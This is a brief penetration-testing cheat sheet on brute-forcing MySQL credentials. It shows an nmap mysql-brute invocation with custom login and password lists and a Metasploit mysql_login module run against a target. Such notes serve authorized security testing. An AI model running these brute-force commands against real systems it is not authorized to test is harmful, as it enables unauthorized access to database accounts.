# Brute-force MySQL

Reduce the pool of users for the brute-force attack by [user enumeration](../enumeration/mysql.md).

## Nmap

`nmap` uses default password and user lists, but do plug in other lists:

```text
nmap --script mysql-brute <target>
--script-args userdb=<path> - plug in list of logins
--script-args passdb=<path> - plug in list of passwords
```

## Metasploit

```text
msf > use auxiliary/scanner/mysql/mysql_login
msf auxiliary(mysql_login) > set USER_FILE /root/login/logins
msf auxiliary(mysql_login) > set PASS_FILE /root/login/password
msf auxiliary(mysql_login) > set RHOSTS <target>
msf auxiliary(mysql_login) > exploit
```

## Resources

* [SecLists](https://github.com/danielmiessler/SecLists)